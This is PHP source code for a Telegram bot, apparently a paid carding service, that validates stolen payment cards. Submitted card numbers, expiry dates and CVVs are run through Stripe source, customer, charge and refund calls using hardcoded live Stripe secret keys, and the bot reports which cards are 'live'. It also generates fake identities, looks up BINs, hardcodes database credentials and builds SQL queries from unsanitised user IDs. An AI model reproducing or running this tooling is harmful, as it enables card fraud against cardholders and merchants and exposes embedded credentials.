<?php
if(strpos($message, '!stb') === 0 or strpos($message, '/stb') === 0 or strpos($message, '.stb') === 0){
reply_to($chatId,$message_id,$keyboard,$maintain);
exit();
    $keyboard = [
    'inline_keyboard' => [
        [
           ['text' => 'Features', 'callback_data' => 'paid'], 
           ['text' => 'Buy', 'callback_data' => 'buy'], 
           ['text' => 'Buy Now', 'url' => 'https://t.me/mausampekapan'], 
        ]
        ]];
$keyboard = json_encode($keyboard);
checkrole($chatId,$message_id,$keyboard,$nopre,$gId);
$starttime = microtime(true);
$flag = 'getFlags';
$mytime = 'time1';

$link = mysqli_connect("sql12.freesqldatabase.com", "sql12601606", "pfCeZJB1Ee", "sql12601606");
    $sql = "SELECT role FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final201 = json_encode($json_array);
    $role = trim(strip_tags(getStr($final201, '"role":"','"')));
mysqli_close($link);
if($role == 'USER'){
    reply_to($chatId,$message_id,$keyboard,$nopre);
    exit();
}elseif(empty($role)){
    reply_to($chatId,$message_id,$keyboard,$noreg);
    exit();
}
sendaction($chatId, typing);
$lista = substr($message, 5);
$lista = clean($lista);
$check = strlen($lista);
$chem = substr($lista, 0,1);
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
$strlenn = strlen($cc);
$strlen1 = strlen($mes);
if($chem == 4){
$type = 'VI';
}elseif($chem == 5){
$type = 'MC';
}
$list = preg_replace('/\s/', '|', $lista);
if (strlen($mes) == 1){
 $mes = '0'.$mes;
 }elseif (strlen($ano) == 2) {
$ano = '20'.$ano;
}
$ano1 = $ano;
$list = preg_replace('/\s/', '|', $lista);
$vaut = array(1,2,6,7,8,9,0);
if (in_array($chem, $vaut)) { 
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
  } 
if (empty($lista)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}elseif($check<15){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}elseif(strlen($strlenn != 16)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}
if(strlen($strlen1 > 2)) {
$ano = $cvv; 
$cvv = $mes;
$mes = $ano1;}

$link = mysqli_connect("sql12.freesqldatabase.com", "sql12601606", "pfCeZJB1Ee", "sql12601606");
    $sql = "SELECT credits FROM persons WHERE userid='$gId'";
    $result = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    $final2 = json_encode($json_array);
    $client = trim(strip_tags(getStr($final2, '"credits":"','"')));
mysqli_close($link);
if($client < 5){ 
    reply_to($chatId, $message_id,$keyboard,$nocredits);
    exit();
}elseif(empty($client)){
    reply_to($chatId, $message_id,$keyboard,$noregister);
    exit();
}

$link = mysqli_connect("sql12.freesqldatabase.com", "sql12601606", "pfCeZJB1Ee", "sql12601606");
    $sql = "SELECT time FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final20 = json_encode($json_array);
    $times = trim(strip_tags(getStr($final20, '"time":"','"')));
mysqli_close($link);

$link = mysqli_connect("sql12.freesqldatabase.com", "sql12601606", "pfCeZJB1Ee", "sql12601606");    
    $sql = "SELECT role FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final201 = json_encode($json_array);
    $role = trim(strip_tags(getStr($final201, '"role":"','"')));
mysqli_close($link);
    $current = time();
    $sec = $current - $times;
    if($role == 'MEMBER' and $sec < 30){
    $after = 30 - $sec;
    $antispam = urlencode("<b>[ANTISPAM] <u> TRY AGAIN AFTER $after sec.</u></b>");
    reply_to($chatId,$message_id,$keyboard,$antispam);
    exit();
    }
$sss = reply_to($chatId,$message_id,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> □□□□□ 0%[🟥] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <a href='tg://user?id=1317173146'>@mausampekapan</a></b>");
$respon = json_decode($sss, TRUE);
$message_id_1 = $respon['result']['message_id'];
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
sendaction($chatId, typing);
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=US');
    preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
    $first = $matches1[1][0];
    preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
    $last = $matches1[1][0];
    preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
    $email = $matches1[1][0];
    preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
    $street = $matches1[1][0];
    preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
    $city = $matches1[1][0];
    preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
    $state = $matches1[1][0];
    $state1 = $matches1[1][0];
    preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
    $phone = $matches1[1][0];
    preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
    $zip = $matches1[1][0];
    preg_match_all("(\"username\":\"(.*)\")siU", $get, $matches1);
    $usrnme = $matches1[1][0];
    preg_match_all("(\"password\":\"(.*)\")siU", $get, $matches1);
    $pass = $matches1[1][0];
    preg_match_all("(\"salt\":\"(.*)\")siU", $get, $matches1);
    $salt = $matches1[1][0];
    $pwd = ''.$pass.''.$salt.'';
    preg_match_all("(\"nat\":\"(.*)\")siU", $get, $matches1);
    $con = $matches1[1][0];
    $numero1 = substr($phone, 1,3);
    $numero2 = substr($phone, 6,3);
    $numero3 = substr($phone, 10,4);
    $phone = $numero1.''.$numero2.''.$numero3;
    $serve_arr = array("gmail.com","hotmail.com","yahoo.com","yopmail.com","outlook.com");
    $serv_rnd = $serve_arr[array_rand($serve_arr)];
    $email = str_replace("example.com", $serv_rnd, $email);
    $state = state($state);
$bin = substr($cc,0,6);
$che = bannedbin($bin);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'http://bins.su/');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_POST, 1);
    $headers = array();
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
    $headers[] = 'Accept-Language: en-US,en;q=0.9';
    $headers[] = 'Cache-Control: max-age=0';
    $headers[] = 'Connection: keep-alive';
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    $headers[] = 'Host: bins.su';
    $headers[] = 'Origin: http://bins.su';
    $headers[] = 'Referer: http://bins.su/';
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.$bin.'&bank=&country=');
    $result = curl_exec($ch);
    $bincap1 = trim(strip_tags(getStr($result, '<td>Bank</td></tr><tr><td>','</td>')));
    $bincap2 = (getStr($result, '<td>'.$bincap1.'</td><td>','</td>'));
    $bincap3 = trim(strip_tags(getStr($result, '<td>'.$bincap2.'</td><td>','</td>')));
    $bincap4 = trim(strip_tags(getStr($result, '<td>'.$bincap3.'</td><td>','</td>')));
    $bincap5 = trim(strip_tags(getStr($result, '<td>'.$bincap4.'</td><td>','</td>')));
    $roldex = trim(strip_tags(getStr($result, '<td>'.$bincap5.'</td><td>','</td>')));
    if(strpos($result, 'No bins found!') or $che == true) {
    edit_message($chatId,$message_id_1,$keyboard, "<b>❌BIN BANNED</b>");
    exit();
    }
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■□□□ 40%[🟧] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <a href='tg://user?id=1317173146'>@mausampekapan</a></b>");

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

# -------------------- [1 REQ] -------------------#

$skArray = array(
    
   
    //1 => 'sk_live_69GKI0saLB8uIEnxzv8VTvRX',
    
 2 => ' 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',
    
   // 2 => 'sk_live_Yg3BCYRPuomB9AZVtsaQh3nF',
  

);

if (isset($skArray)) { 
 $sk = $skArray[array_rand($skArray)]; 
} else {
    echo 'YOU SUCK BRO';
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=carolprogay&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');
   $result1 = curl_exec($ch);
  $s = json_decode($result1, true);
  
  $token = $s['id'];




$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port")
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$name.' '.$last.'&source='.$token.'');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
   $result2 = curl_exec($ch);
  $cus = json_decode($result2, true);
$token3 = $cus['id'];

   // echo $token1 = $cus['id'];
   //  echo $token1 = $cus['id'];
 $message = trim(strip_tags(getStr($result2,'"message": "','"')));

 $cvvcheck = trim(strip_tags(getStr($result2,'"cvc_check": "','"')));

 $declinecode = trim(strip_tags(getStr($result2,'"code": "','"')));

echo "<span>  cvv_check = ".$cvvcheck."</span>";


//[Charge Section]
 //curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);

  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=5000&currency=inr&customer='.$token3.'');
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  $result3 = curl_exec($ch);

   $char = json_decode($result3, true);
 $chtoken = trim(strip_tags(getStr($result3,'"charge": "','"')));
   $chargetoken = $char['charge'];
$decline3 = trim(strip_tags(getStr($result3,'"decline_code": "','"')));
$recpul = trim(strip_tags(getStr($result,'"receipt_url": "','"')));

  $ch = curl_init();
   //curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);

  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/refunds');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'charge='.$chtoken.'&amount=5000&reason=requested_by_customer');
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
 $result4 = curl_exec($ch);
 
 
 $recpul = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));
curl_close($ch);
$ccc = multiexplode(array(". ", "."), $error)[0];
$res = multiexplode(array(". ", "."), $error)[1];
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■■■ 100%[🟩] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <a href='tg://user?id=1317173146'>@mausampekapan</a></b>");
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
// success":false,"error":true,"
if (strpos($result3, '"cvc_check": "pass"')) {
  $status = 'Approved✅';
  $cc_code = 'CVV PASS';
  $author = 'CVV Matched';
  cvv($list);
}elseif (strpos($result31, '"cvc_check": "pass"')) {
  $status = 'Approved✅';
  $cc_code = 'CVV PASS';
  $author = 'CVV Matched';
    cvv($list);
}elseif(strpos($result3, "Thank You For Donation." )) {
  $status = 'Approved✅';
  $cc_code = 'CHARGED ';
  $author = 'CVV Matched';
    cvv($list);
}elseif(strpos($result3, "Thank You." )) {
  $status = 'Approved✅';
  $cc_code = 'CHARGED';
  $author = 'CVV matched';
    cvv($list);
}elseif(strpos($result3, "Your card has insufficient funds." )) {
  $status = 'Approved✅';
  $cc_code = 'Your card has insufficient funds.';
  $author = 'CVV matched';
    cvv($list);
}elseif(strpos($result3, "Your card's security code is incorrect" )) {
  $status = 'Approved✅';
  $cc_code = 'CCN Live';
    ccn($list);
}elseif(strpos($result3, 'security code is invalid.' )) {
  $status = 'Approved✅';
  $cc_code = 'CCN Live';
      ccn($list);
}elseif(strpos($result3, 'Invalid service code (restricted)' )) {
  $status = 'Approved✅';
  $cc_code = 'CCN or CVV Live';
      ccn($list);
}elseif (strpos($result3, "Invalid CVV value")) {
  $status = 'Approved✅';
  $cc_code = 'CCN Live';
      ccn($list);
} elseif (strpos($result3, "Card is expired")) {
  $status = 'Dead❌';
  $cc_code = 'Expired';
}elseif(strpos($result3, 'Invalid Card Number' )) {
  $status = 'Betichod❌';
  $cc_code = 'incorrect_zip';
}elseif (strpos($result3, "Hold card (stolen)")) {
  $status = 'Approved✅';
  $cc_code = 'Hold card (stolen)';
}elseif (strpos($result3, "stolen_card")) {
  $status = 'Approved✅';
  $cc_code = 'Hold card (stolen)';
}elseif (strpos($result3, "pickup_card")) {
  $status = 'Approved✅';
  $cc_code = 'Hold card (pickup)';
}elseif (strpos($result3, 'action="./fee_declined.php" ')) {
  $status = 'Error❌';
  $cc_code = 'Fee Decline(Does Not Support Card)';
}elseif(strpos($result3, 'Card number error')) {
  $status = 'Declined ❌';
  $cc_code = 'Card number error';
}elseif(strpos($result3, 'No such issuer')) {
  $status = 'Declined ❌';
  $cc_code = 'NO SUCH ISSUER. Returned when the first 6 digits of the card number are not recognized by the Issuer.Re-enter transaction.';
}elseif (strpos($result3, "pickup_card")) {
  $status = 'Approved✅';
  $cc_code = 'pickup_card';
  cvv($list);
}elseif(strpos($result3, 'Your card number is incorrect.')) {
  $status = 'Declined ❌';
  $cc_code = 'incorrect_number';
}elseif (strpos($result3, "incorrect_number")) {
  $status = 'Declined ❌';
  $cc_code = 'incorrect_number';
}elseif(strpos($result3, 'do_not_honor')) {
  $status = 'Declined ❌';
  $cc_code = 'do_not_honor';
}elseif (strpos($result3, "generic_decline")) {
  $status = 'Declined ❌';
  $cc_code = 'generic_decline';
}elseif (strpos($result3, "Your card was declined.")) {
  $status = 'Declined ❌';
  $cc_code = 'Card Declined';
}elseif (strpos($result3, '"cvc_check": "unchecked"')) {
  $status = 'Declined ❌';
  $cc_code = 'unchecked';
}elseif (strpos($result3, 'Transaction not permitted (Card)')) {
  $status = 'Declined ❌';
  $cc_code = 'Transaction not permitted (Card)';
}elseif (strpos($result3, "You have tried this card too many times, please contact merchant.")) {
  $status = 'Declined❌';
  $cc_code = 'You have tried this card too many times, please contact merchant.';
}elseif (strpos($result3,'Merchant does not accept this card, try a different card')) {
  $status = 'Declined ❌';
  $cc_code = 'Merchant does not accept this card, try a different card';
}else{
  $status = 'Declined ❌';
  $cc_code = 'Unknown Errror.';
}
if(!empty($ccc)){
    $status = $ccc;
}if(!empty($res)){
    $cc_code = $res;
}
if(empty($result) or empty($ccc) or empty($res)){
$result = urlencode("<b>
GATE --> <i>AUTH - CHARGE 10USD</i>
CC ->> <code>$cc|$mes|$ano|$cvv</code>
Result ->> Unknown error
Message ->> Check again
Bin Info ->> $bincap4-$bincap3-$bincap5
Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
Time ->> {$mytime($starttime)}s
Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[<i>$role</i>]
Credit Left ->> ${balance}💰
Bot By --> <a href='tg://user?id=1317173146'>@mausampekapan</a></b>");
edit_message($chatId,$message_id_1,$keyboard, $result);
    $timest = time();

$link = mysqli_connect("sql12.freesqldatabase.com", "sql12601606", "pfCeZJB1Ee", "sql12601606");
    $sql = "UPDATE persons SET time = '$timest' WHERE persons.userid='$gId'";
    $result21 = mysqli_query($link, $sql);
mysqli_close($link);
exit();
}


$link = mysqli_connect("sql12.freesqldatabase.com", "sql12601606", "pfCeZJB1Ee", "sql12601606");
    $sql = "SELECT credits FROM persons WHERE userid='$gId'";
    $result = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    $final2 = json_encode($json_array);
    $client = trim(strip_tags(getStr($final2, '"credits":"','"')));
mysqli_close($link);
    $balance = $client - 5;

$link = mysqli_connect("sql12.freesqldatabase.com", "sql12601606", "pfCeZJB1Ee", "sql12601606");
    $sql = "UPDATE persons SET credits = '$balance' WHERE persons.userid='$gId'";
    $result = mysqli_query($link, $sql);
mysqli_close($link);
$result = urlencode("<b>
GATE --> <i>AUTH - CHARGE 10USD</i>
CC ->> <code>$cc|$mes|$ano|$cvv</code>
Result ->> $status
Message ->> $cc_code
Bin Info ->> $bincap4-$bincap3-$bincap5
Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
Time ->> {$mytime($starttime)}s
Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[<i>$role</i>]
Credit Left ->> ${balance}💰
Bot By --> <a href='tg://user?id=1317173146'>@mausampekapan</a></b>");
edit_message($chatId,$message_id_1,$keyboard, $result);
    rest($list);
    $timest = time();

$link = mysqli_connect("sql12.freesqldatabase.com", "sql12601606", "pfCeZJB1Ee", "sql12601606");
    $sql = "UPDATE persons SET time = '$timest' WHERE persons.userid='$gId'";
    $result21 = mysqli_query($link, $sql);
mysqli_close($link);
}
?>